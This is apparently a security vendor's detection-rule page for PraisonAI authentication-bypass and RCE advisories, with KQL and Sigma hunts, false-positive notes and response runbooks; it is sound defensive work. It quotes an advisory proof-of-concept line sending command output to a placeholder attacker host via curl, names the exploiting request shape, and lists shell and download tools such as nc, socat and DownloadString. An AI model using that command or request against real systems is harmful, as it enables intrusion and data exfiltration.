Unauthenticated POST to PraisonAI /api/v1/runs (GHSA-fq2m-6wqh-x44g exploitation) AIExploitation High
Detects inbound HTTP POSTs to the unauthenticated PraisonAI job-submission endpoint /api/v1/runs, with no Authorization header — the load-bearing exploit shape from the advisory. Pairs reverse-proxy / WAF logs with on-host network telemetry to the default port 8005. Rationale: Targets the exact path (/api/v1/runs), method (POST), and the absence of an Authorization header from the advisory's empirical PoC table, plus the article's named default port 8005. Multi-table union covers IIS, generic WAF/CSL, and ASIM web-session shippers; the Defender path uses inbound-connection telemetry from the vulnerable python process to give an EDR-side signal when no web tier sits in front. Skipped Sigma because the cross-product/cross-table union doesn't fit a single selection block.
ATT&CKT1190 T1059.006
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate first-party backend service submitting jobs from a known internal IP range
  • Internal API health-check / smoke-test pipelines polling the endpoint without an Authorization header (by design — the API doesn't require one)
  • Authorized vulnerability scanner (Nessus/Qualys/Burp) firing test traffic at the path
  • Load-balancer health probes hitting /api/v1/runs even though target should be a healthz path
Suppression filter

Response runbook
1. Triage: pull the full request body from the WAF/proxy if available — if it contains `prompt`, `agent_yaml`, or `framework`, treat as confirmed exploitation, not scanning. Correlate SourceIP to the org's known backend ranges and authorized scanners. 2. Contain: WAF-block POSTs to /api/v1/runs from any IP not on the backend allowlist; if no WAF, take the praisonai jobs server offline and rebind to 127.0.0.1. Rotate every secret the praisonai process had access to (OPENAI_API_KEY, ANTHROPIC_API_KEY, Azure/Bedrock keys, tool tokens). 3. Hunt: list every job ID submitted since first malicious POST via `GET /api/v1/runs` (operator side) and pull their stored prompts/results to assess what data the agent retrieved; chain into the UC for executor child-process spawns to catch any LLM-driven RCE that landed.

PraisonAI executor child-process spawn (post-RCE via agent tool invocation) AIActions on Objectives Medium
Detects the praisonai/crewai/autogen executor process spawning interactive shells or LOLBins — the visible footprint when an attacker abuses the unauthenticated /api/v1/runs API to run agent code whose tools shell out. The parent is python loading praisonai.jobs modules; the child is anything that shouldn't be there. Rationale: Pivots on the three frameworks the article names in JobSubmitRequest.framework (praisonai/crewai/autogen) as parent context, then filters for the shell/LOLBin children that are the high-fidelity indicator that an attacker-supplied prompt's tool calls actually executed. The parent-child pair is what turns this from generic 'python ran bash' into article-specific RCE evidence. Single-event-shape parent+child match so Sigma is appropriate.
ATT&CKT1059 T1059.001 T1059.004 T1068
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Operator intentionally wires a shell/code-execution tool into the agent (legitimate behaviour that looks identical)
  • crewai/autogen tutorial or notebook that invokes `subprocess` during demo runs
  • Pip post-install hooks running during container build that happen to live under a praisonai virtualenv path
  • Internal red-team / dev testing agent tools that shell out
  • Health-check script bundled as a 'tool' for the agent that pings outbound with curl
Suppression filter
| where InitiatingProcessCommandLine !contains "site-packages/praisonai/tools/code_interpreter" and InitiatingProcessFolderPath !contains "\\.venv\\build\\" and not (FileName in~ ("curl","curl.exe") and ProcessCommandLine has_any ("api.openai.com","api.anthropic.com","bedrock-runtime"))
Response runbook
1. Triage: pull the originating job from the praisonai job store (`GET /api/v1/runs/{job_id}`) — examine the submitted prompt and agent_yaml to determine whether the shell-out was operator-configured or attacker-injected. Correlate the parent process's earlier inbound connection to identify the submitting source IP. 2. Contain: kill the executor process and child shell; if attacker-driven, isolate the host, rotate every credential the process had access to (LLM API keys, tool tokens, on-disk YAML recipe secrets), and take the unauthenticated jobs server offline pending upgrade and binding fix. 3. Hunt: from the same host, pivot on DeviceFileEvents / DeviceNetworkEvents within the executor's process tree for staged downloads, dropped scripts, or outbound C2; enumerate every job submitted in the same window via the list endpoint to find any other prompts the attacker queued.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine has_any ("praisonai","crewai","autogen") and InitiatingProcessFileName in~ ("python.exe","python","python3","python3.exe","pythonw.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","bash","sh","zsh","dash","wscript.exe","cscript.exe","mshta.exe","curl","curl.exe","wget","wget.exe","nc","ncat","socat")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, ProcessId
| order by Timestamp desc
union isfuzzy=true
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("python.exe","python3.exe","pythonw.exe")
  | extend ParentCmd = tostring(parse_json(EventData).ParentProcessName)
  | where CommandLine has_any ("praisonai","crewai","autogen") or ParentProcessName has_any ("praisonai","crewai","autogen")
  | where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\wscript.exe","\\cscript.exe","\\mshta.exe","\\curl.exe","\\nc.exe")
  | project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine),
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessCommandLine has_any ("praisonai","crewai","autogen")
  | where ActingProcessName has_any ("cmd","powershell","pwsh","bash","sh","zsh","dash","wscript","cscript","mshta","curl","wget","nc","ncat","socat")
  | project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine)
| order by TimeGenerated desc

status: experimental
description: Detects shells or download/transfer LOLBins spawned by a python process running the praisonai/crewai/autogen executor, which is the visible footprint when an attacker abuses the unauthenticated PraisonAI Jobs API to run agent tools that shell out.

Unauthenticated POST to PraisonAI /runs endpoint (recipe-serve auth bypass exploitation) AIExploitation Medium
Hunts HTTP POST requests to the praisonai recipe-serve endpoints (/runs, /recipes, /invoke) that return 2xx without an X-API-Key or Authorization header — the exact request shape that exercises the GHSA-j4hj-7hfh-g2f4 silent-bypass branch in APIKeyAuthMiddleware/JWTAuthMiddleware. Article-specific because it pivots on praisonai's documented route and the auth-header absence that drives the fail-open branch. Rationale: Targets the exact request shape exercised by the PoC (POST /runs with empty X-API-Key / Authorization headers) — the article quotes `serve.py:325-333` accepting these as authenticated when the secret is unset. Pivots on auth-header absence rather than the praisonai 4.6.48 hash so it catches operators on any sub-version of the same fail-open branch. Cross-checked against: • https://github.com/MervinPraison/PraisonAI • https://github.com/advisories/GHSA-j4hj-7hfh-g2f4
ATT&CKT1190 T1078

Expected false positives · estimated rate: medium — model-assessed, tune to your environment

  • Health-check probes from load balancers hitting recipe routes (rare — usually /health)
  • Internal CI/CD pipelines invoking praisonai recipes without auth headers
  • Scanner traffic from authorised internal vulnerability scans
  • Reverse-proxy stripping the X-API-Key header before logging (logging gap, not actual bypass)

PraisonAI recipe-serve Python process spawning shell/code-exec child (post-bypass RCE) AIInstallation Medium
Detects a Python interpreter running praisonai recipe-serve that goes on to spawn cmd/powershell/sh/bash/curl/wget — the post-authentication-bypass RCE path called out in the article's Impact section (recipe execution wired to tools yields direct code execution). Article-specific because it anchors on the parent command line containing `praisonai`/`recipe.serve`/`serve.py`. Rationale: Anchors on the article's documented call-site `auth_type = config.get("auth")` and the recipe-serve module path (`praisonai/recipe/serve.py`) — any Python process whose command line carries that path or the `praisonai recipe serve` CLI invocation, then spawns a shell/download utility, is by definition either the operator running an attacker-controlled recipe payload or the result of the unauth /runs POST in UC1. Cross-checked against: • https://github.com/MervinPraison/PraisonAI • https://github.com/advisories/GHSA-j4hj-7hfh-g2f4
ATT&CKT1059 T1190 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate praisonai recipes that intentionally shell out for build/deploy automation (operator-authored)
  • Recipe debugging by the operator from a local terminal
  • Health/readiness probes that invoke a curl sub-process from inside the recipe-serve container
  • Periodic cron tasks bundled into the same container that use python+sh
  • Init-container patterns where the praisonai entrypoint script bootstraps via sh -c
Suppression filter
| where not (ActingProcessCommandLine has_any ("healthcheck","readiness","liveness") and TargetProcessCommandLine has_any ("curl -sf http://localhost","curl -fsS http://127.0.0.1"))
Response runbook
1) Triage: pull the parent Python command line and the child's command line/SHA256 from the EDR event; cross-reference the YAML recipe definitions on the host (`config.get("auth")` block per the article) — if the operator's recipes do not legitimately shell out, the child is hostile. 2) Contain: isolate the host, snapshot the praisonai working directory and the in-flight recipe inputs (the article notes operator prompts/LLM responses are reachable), then kill the recipe-serve process and revoke any service credentials it could touch. 3) Hunt: walk the process tree forward from the spawned shell looking for outbound C2, credential access, or new persistence; query UC1 for the unauth /runs POST that preceded this spawn within a 60-second window to confirm the attack chain.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","python3.exe","python","python3","uvicorn.exe","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai","recipe serve","recipe/serve.py","recipe.serve","-m praisonai")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","sh","bash","dash","curl.exe","curl","wget.exe","wget","nc.exe","ncat.exe","certutil.exe","bitsadmin.exe")
    or ProcessCommandLine has_any ("/bin/sh -c","/bin/bash -c","Invoke-Expression","IEX (","DownloadString","base64 -d","python -c")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd = InitiatingProcessCommandLine,
          ChildImage = FolderPath,
          ChildCmd = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName matches regex @"(?i)\b(python3?|uvicorn|gunicorn)(\.exe)?$"
| where ActingProcessCommandLine has_any ("praisonai","recipe serve","recipe/serve.py","recipe.serve","-m praisonai")
| where TargetProcessName matches regex @"(?i)\b(sh|bash|dash|cmd\.exe|powershell\.exe|pwsh\.exe|curl(\.exe)?|wget(\.exe)?|nc(\.exe)?|ncat(\.exe)?|certutil\.exe|bitsadmin\.exe)$"
    or TargetProcessCommandLine has_any ("/bin/sh -c","/bin/bash -c","Invoke-Expression","IEX (","DownloadString","base64 -d")

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.

Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or SHA1 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or MD5 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or SHA1 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or MD5 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] PraisonAI unauthenticated Jobs API request (POST /api/v1/runs) · Article-specific behavioural hunt — [GHSA / CRITICAL] GHSA-4869-x4pr-q22x: PraisonAI: Unauthenticated RCE via Jobs A
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] PraisonAI workflow runtime spawning shell/curl/wget child (RCE manifestation)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Unexpected egress from PraisonAI host to non-LLM destination
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
PraisonAI unauthenticated Jobs API request (POST /api/v1/runs) AIExploitation High
Detects inbound HTTP POST requests to the PraisonAI Jobs API endpoint `/api/v1/runs` (default port 8005), which lacks `Depends(verify_token)` and is exploitable for unauthenticated RCE per GHSA-4869-x4pr-q22x. Pre-positions a perimeter alert before the LLM-driven execute_command stage fires on the host. Rationale: Anchored on the exact endpoint string `/api/v1/runs` and default port `8005` named in the GHSA PoC. Cross-checked against Sysdig's CVE-2026-44338 writeup and gbhackers reporting on rapid PraisonAI exploitation — the same Jobs API attack surface is in active scan-and-exploit campaigns, so any inbound POST from a public source IP to this path is high-fidelity. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://gbhackers.com/praisonai-vulnerability-actively-exploited/
ATT&CKT1190 T1078
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal QA / integration tests hitting the Jobs API from a CI/CD runner with a public NAT egress IP
  • Authorized red-team or pentest reconnaissance during a scheduled engagement
  • Load-balancer or reverse-proxy health probes that NAT through a public IP
  • Legitimate operator triggering a job from a remote IP without VPN
  • Vulnerability scanners (Nessus, Qualys, Rapid7) probing the endpoint
Suppression filter
and not (SrcIpAddr in ("<CI-egress-IP-1>", "<CI-egress-IP-2>")) and not (HttpRequestHeaderUserAgent has_any ("kube-probe", "ELB-HealthChecker", "GoogleHC"))
Response runbook
1) Triage: pull the full request body from proxy/WAF logs and grep for `approve` and `execute_command` in the `agent_yaml` field — presence confirms exploit attempt vs benign call. Identify caller IP, geo-ASN, and whether the source is in any allowed CI/CD egress set. 2) Contain: place the PraisonAI host behind auth (reverse-proxy IP allowlist or mTLS) or take the Jobs API offline; upgrade praisonai > 4.6.48 once patched. Block the caller IP at WAF/perimeter. 3) Hunt: pivot to UC2 (python parent → shell child) and UC3 (egress to non-LLM destinations) on the praisonai host for the ±2h window. Check `~/.bash_history`, `/tmp`, `/var/tmp`, and the praisonai working directory for dropped payloads.
// Defender lacks raw HTTP body — pivot on inbound TCP to the Jobs API port from a public source where the listening process is the praisonai/uvicorn runtime.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where LocalPort == 8005
| where ActionType in ("InboundConnectionAccepted", "ConnectionAccepted", "ListeningConnectionCreated")
| where RemoteIPType == "Public"
| where InitiatingProcessFileName in~ ("python.exe","python","python3","python3.exe","uvicorn","uvicorn.exe","gunicorn")
   or InitiatingProcessCommandLine has_any ("praisonai","praisonai.jobs","uvicorn")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url has "/api/v1/runs"
| where not(ipv4_is_private(SrcIpAddr))
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber, Url, HttpMethod, HttpRequestHeaderUserAgent, HttpRequestBodyBytes, EventProduct
| order by TimeGenerated desc

PraisonAI workflow runtime spawning shell/curl/wget child (RCE manifestation) AIInstallation High
Detects the Python runtime hosting PraisonAI (parent process is python / uvicorn / gunicorn with `praisonai` in its command line) spawning a shell or download utility as a child. Per the advisory, the bypass chain ends at `subprocess.Popen(['curl', ...])` in `shell_tools.py:33` — this is the on-host signal that the YAML `approve: [execute_command]` bypass actually fired. Rationale: Anchored on the exact runtime chain documented in the advisory: `uvicorn`/`python` running praisonai → `subprocess.Popen(["curl", ...])` at `shell_tools.py:33`. The `praisonai` keyword in the parent command line is what suppresses the FP set of generic Python admin scripts shelling out — it's the article-specific delimiter. Cross-checked Sysdig's writeup which describes the same shell-spawn pattern on exploited hosts. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation
ATT&CKT1059.004 T1059.003 T1190 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator running a benign PraisonAI workflow that legitimately uses `web_search` / `run_command` against a known internal endpoint
  • PraisonAI's own LLM-fetching shim calling curl to download a local model artifact at startup
  • Container start-up hook in the praisonai Docker image running curl/wget for entrypoint health-check
  • Developer running praisonai under uvicorn locally and triggering a shell pipeline for testing
  • Autoscaler / Helm chart probes that invoke a sh inside the praisonai pod
Suppression filter
| where not (ProcessCommandLine has_any ("--version", "--help")) | where not (InitiatingProcessCommandLine has_any ("pytest", "--reload")) | where AccountName !endswith "$"
Response runbook
1) Triage: capture the full child `ProcessCommandLine` and look for hallmarks of the GHSA PoC — curl/wget targeting an external URL with shell-substitution output (`?output=`, `?out=`, `uid=`, `$(`). Pivot to UC1 for an inbound POST to /api/v1/runs in the prior 5 minutes. 2) Contain: kill the parent python/uvicorn PID, take the host off the network, snapshot memory and `/tmp`. Rotate any OPENAI/ANTHROPIC API keys and other secrets reachable from the praisonai process environment. 3) Hunt: enumerate all child processes of the parent PID for the last 30 days; check `crontab`, `~/.ssh/authorized_keys`, `/etc/systemd/system/*.service`, and the praisonai working directory for persistence. Sweep the network for outbound to the attacker URL identified in step 1.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","python","python3","python3.exe","uvicorn","uvicorn.exe","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai","praisonai.jobs","praisonaiagents","praisonai/api","uvicorn")
| where FileName in~ ("curl","curl.exe","wget","wget.exe","sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh","pwsh.exe","nc","ncat","socat")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("python","uvicorn","gunicorn")
| where ParentProcessCommandLine has_any ("praisonai","praisonai.jobs","praisonaiagents","uvicorn")
| where TargetProcessName has_any ("curl","wget","/sh","/bash","/dash","/zsh","cmd.exe","powershell.exe","pwsh","nc","ncat","socat")
| extend ChildBin = tostring(split(TargetProcessName, "/")[-1])
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          TargetProcessName, TargetProcessCommandLine, ChildBin
| order by TimeGenerated desc

Unexpected egress from PraisonAI host to non-LLM destination AICommand & Control Medium
PraisonAI server processes should only egress to known LLM endpoints (OpenAI, Anthropic, Google AI, Azure OpenAI, Ollama). Detects the python/uvicorn runtime, or any child it spawns, making outbound connections to any other public destination — the network manifestation of the PoC's `curl http://<ATTACKER>/pwn?output=$(id)` exfil and post-RCE C2/staging. Rationale: PraisonAI's only legitimate public egress is to LLM provider APIs — anything else from the same process or its descendants is suspicious. Anchored on the article's PoC `curl http://<ATTACKER>/pwn?output=$(id)` exfil. Sysdig confirms attackers automate stage-2 payload pulls and exfil within hours of disclosure, so an allowlist-anti-join is the right shape rather than IOC matching. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://gbhackers.com/praisonai-vulnerability-actively-exploited/
ATT&CKT1041 T1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A newly-onboarded LLM provider (Cohere, Mistral, xAI, etc.) not yet in the allow-list
  • PraisonAI tool that legitimately fetches a remote PDF / web page via web_search or read_url tool
  • Pip / package-manager calls during container start (pulls from pypi.org)
  • Telemetry / error reporting (Sentry, Datadog APM, OpenTelemetry collector) from the praisonai process
  • Self-hosted model server (Ollama / vLLM) reached over a public IP rather than internal DNS
Suppression filter
| where not (RemoteUrl has_any ("pypi.org", "files.pythonhosted.org", "sentry.io", "datadoghq.com", "otel-collector")) | where not (InitiatingProcessCommandLine has "pip install")
Response runbook
1) Triage: check whether the destination is a legit LLM/SaaS the org has approved but hasn't allow-listed — query the DNS history and reverse-DNS / WHOIS for the RemoteIP. Pivot to UC1 (inbound POST /api/v1/runs in the prior 10 min) and UC2 (curl/sh child of python) on the same host. 2) Contain: if confirmed malicious destination, block the IP + domain at egress proxy / firewall, isolate the praisonai host. Rotate any LLM API keys present in the host's env or secret store — they're at the same exposure as code execution. 3) Hunt: extract the full curl/wget command line for IOCs (URL, query parameters with command output like `uid=`, encoded data), feed to threat intel. Sweep the rest of the fleet for outbound to that infra over the last 30 days. Check for additional vulnerable PraisonAI deployments (any host listening on :8005).

PraisonAI MCP SSE server launched with vulnerable defaults (GHSA-x227-pf99-vffg) AIInstallation High
Detects start of the PraisonAI MCP SSE transport (ToolsMCPServer.run_sse / launch_tools_mcp_server) which by default binds 0.0.0.0 and skips the bundled SecurityConfig — exposing unauthenticated tools/call JSON-RPC to anyone who can reach the port. High-fidelity inventory signal for hosts running the vulnerable code path; precondition for the GHSA-described RCE. Rationale: Anchored on the specific Python module path (praisonaiagents.mcp.mcp_server) and entry-point names (launch_tools_mcp_server, ToolsMCPServer, run_sse) called out at src/praisonai-agents/praisonaiagents/mcp/mcp_server.py:245/301 in the advisory. These strings only appear in process command lines when the vulnerable transport is actually being invoked — pre-fix versions (<1.6.59) default to 0.0.0.0 with no middleware wired in, so any hit is a deployed-and-exposed instance.
ATT&CKT1190 T1133 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Production PraisonAI deployment intentionally exposing MCP over SSE behind an authenticated reverse proxy
  • Developer running unit/integration tests for praisonaiagents on a localhost-only bind
  • CI/CD job (GitHub Actions, Jenkins) installing and smoke-testing praisonaiagents
  • Patched version >= 1.6.59 where SecurityConfig.require_auth defaults to True and host defaults to 127.0.0.1
  • Security researcher / blue team reproducing the advisory PoC in a sandbox
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("127.0.0.1","localhost","::1") and InitiatingProcessCommandLine !has "0.0.0.0")
| where not (InitiatingProcessCommandLine has "praisonaiagents" and InitiatingProcessFolderPath has_any ("\\.venv\\","\\venv\\","\\.tox\\","\\site-packages\\tests\\"))
Response runbook
1) Triage: confirm the python/uvicorn process is actually serving SSE — pull the parent script, inspect imports for praisonaiagents.mcp.mcp_server, and check `pip show praisonaiagents` version on the host (< 1.6.59 is vulnerable). Use `netstat -ano | findstr :<port>` (or `ss -ltnp`) to verify the bind address — 0.0.0.0/:: means externally reachable. 2) Contain: if bound to 0.0.0.0 and version < 1.6.59, kill the process (or `systemctl stop` the service), block the listening port at the host firewall, and remove from any load balancer until upgraded to 1.6.59+ with require_auth=True. 3) Hunt: pivot on the same host into DeviceNetworkEvents for inbound connections to that port from non-RFC1918 IPs in the last 30 days, and into DeviceProcessEvents for children of the python PID matching UC2 (shell/LOLBin spawn) — any hit is a likely successful tools/call RCE.

      or InitiatingProcessFileName in~ ("python.exe","python3.exe","pythonw.exe","python","python3"))
| where ProcessCommandLine has "praisonaiagents"
    or InitiatingProcessCommandLine has "praisonaiagents"
| where ProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse","transport=\"sse\"","transport='sse'")
    or InitiatingProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse","transport=\"sse\"","transport='sse'")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where TargetProcessName has_any ("python.exe","python3.exe","pythonw.exe","python","python3","uvicorn","uvicorn.exe")
     or ActingProcessName has_any ("python.exe","python3.exe","pythonw.exe","python","python3")
| where TargetProcessCommandLine has "praisonaiagents"
     or ActingProcessCommandLine has "praisonaiagents"
| where TargetProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse","transport=\"sse\"","transport='sse'")
     or ActingProcessCommandLine has_any ("praisonaiagents.mcp","mcp_server","launch_tools_mcp_server","ToolsMCPServer","run_sse")
| where ActorUsername !endswith "$"

title: PraisonAI MCP SSE Server Launched (GHSA-x227-pf99-vffg)
id: 8a3b5c6d-9e1f-4a2b-8d4e-5f6a7b8c9d0e
description: Detects launch of the vulnerable PraisonAI MCP SSE transport which by default binds 0.0.0.0 with no authentication and no Origin validation. The bundled mcp_security.py controls (validate_auth_header, is_valid_origin, SecurityConfig) are never wired in by the transport, so any reachable host can list and invoke registered tools without credentials.

PraisonAI MCP host spawns shell/LOLBin — likely unauthenticated tools/call RCE (GHSA-x227-pf99-vffg) AIActions on Objectives High
Detects a Python (or uvicorn) process whose command line references praisonaiagents.mcp spawning a shell, scripting host, or recon/download LOLBin. Under the GHSA, any reachable client can invoke registered tools without credentials — if a file/shell/code-exec tool is registered, this is the post-exploit child-process signature. Rationale: Anchors on the GHSA's exploitation chain: an unauthenticated POST to /messages/?session_id=… with method=tools/call invokes whatever tool is registered. If a file/shell/code-exec tool is registered (the article's stated RCE precondition), the host signature is the python/uvicorn worker (parent_cmd contains 'praisonaiagents') spawning a shell/scripting host/LOLBin — a combination that should essentially never occur in legitimate PraisonAI operation. The parent_cmd 'praisonaiagents' filter is what separates this from generic 'python spawns shell' noise.
ATT&CKT1059 T1059.001 T1059.003 T1059.004 T1190 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PraisonAI tenant has intentionally registered a shell/system tool (e.g. a 'run_command' agent) — legitimate but indistinguishable from RCE on this signal alone; review tool registry
  • PraisonAI internals shelling out to git/pip during dynamic tool import
  • Developer triggering a debug tool invocation locally against a loopback-bound dev instance
  • Agent framework spawning python sub-interpreters via subprocess (only false-positive for shells, not for cmd/curl/whoami)
Suppression filter
| where not (FileName =~ "git.exe" or FileName =~ "pip.exe" or FileName =~ "pip3")
| where not (ProcessCommandLine has_any ("git rev-parse","pip show","pip list") and FileName in~ ("cmd.exe","sh","bash"))
Response runbook
1) Triage: pull the parent python PID's full command line and the registered tool list — if any tool's handler executes shell/file content, this finding is plausible-legitimate; if none does, treat as confirmed RCE. Capture the child process's full cmdline (often contains the attacker's commands verbatim) and the device's exposed SSE port from netstat. 2) Contain: terminate the python/uvicorn process, isolate the host via Defender Device Isolation (or equivalent), revoke any IAM/cloud creds the python process could read from env, and block inbound to the SSE port at network edge. 3) Hunt: pivot on InitiatingProcessId to enumerate all sibling children of the same python PID in the last 24h; query DeviceNetworkEvents from this host to find C2/exfil; query for the same parent_cmd pattern fleet-wide via UC1 to find other exposed instances before they get hit.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","python3.exe","pythonw.exe","python","python3","uvicorn","uvicorn.exe")
| where InitiatingProcessCommandLine has "praisonaiagents"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe",
                     "bash","sh","zsh","dash",
                     "whoami.exe","whoami","hostname.exe","hostname",
                     "ipconfig.exe","ifconfig","ip",
                     "net.exe","net1.exe","nltest.exe","systeminfo.exe","tasklist.exe","ps",
                     "curl.exe","curl","wget.exe","wget",
                     "certutil.exe","bitsadmin.exe",
                     "nc","ncat","ncat.exe",
                     "schtasks.exe","at.exe","reg.exe",
                     "rundll32.exe","regsvr32.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("python.exe","python3.exe","pythonw.exe","python","python3","uvicorn","uvicorn.exe")
| where ParentProcessCommandLine has "praisonaiagents"
| where TargetProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe",
                                   "bash","sh","zsh","dash",
                                   "whoami.exe","whoami","hostname.exe","hostname",
                                   "ipconfig.exe","ifconfig","ip",
